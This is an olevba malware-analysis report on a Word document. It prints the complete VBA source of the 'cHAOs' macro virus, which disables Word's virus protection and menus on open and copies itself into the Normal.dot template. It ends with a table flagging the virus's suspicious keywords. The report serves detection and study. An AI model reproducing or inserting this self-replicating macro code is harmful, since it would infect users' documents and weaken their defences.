olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poc-d68457f14c1d03df62710bba9aae985eb75efb46
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poc-d68457f14c1d03df62710bba9aae985eb75efb46 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cHAOs.bas 
in file: Virus.MSWord.Poc-d68457f14c1d03df62710bba9aae985eb75efb46 - OLE stream: 'Macros/VBA/cHAOs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'cHAOs virus authored by aLPHABETs
'aLPHABETs InC.

Sub ViewVBCode()
End Sub

Sub AutoOpen()
Application.EnableCancelKey = False
Options.VirusProtection = False
Set V1Stealth = CommandBars("Tools")
V1Stealth.Enabled = False

If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "cHAOs" Then GoTo EndCleaner
  Next i
    VSource = NormalTemplate.FullName
    VTarget = ActiveDocument.FullName
Else
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "cHAOs" Then GoTo EndCleaner
  Next i
    VSource = ActiveDocument.FullName
    VTarget = NormalTemplate.FullName
End If
Application.OrganizerCopy VSource, VTarget, "cHAOs", wdOrganizerObjectProjectItems
EndCleaner:
End Sub

Sub Save()
Set myDocument = ActiveDocument
With myDocument.Shapes.AddShape(msoSmileyFace, 90, 90, 90, 50).Fill
    .ForeColor.RGB = RGB(128, 0, 0)
    .BackColor.RGB = RGB(170, 0, 170)
    .TwoColorGradient msoGradientHorizontal, 1
End With
End Sub

Sub AutoClose()
Dim Count As Integer
    For Count = 1 To 10
        Beep
        Beep
    Next
MsgBox "Embrace The Power Of Chaos!!"
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
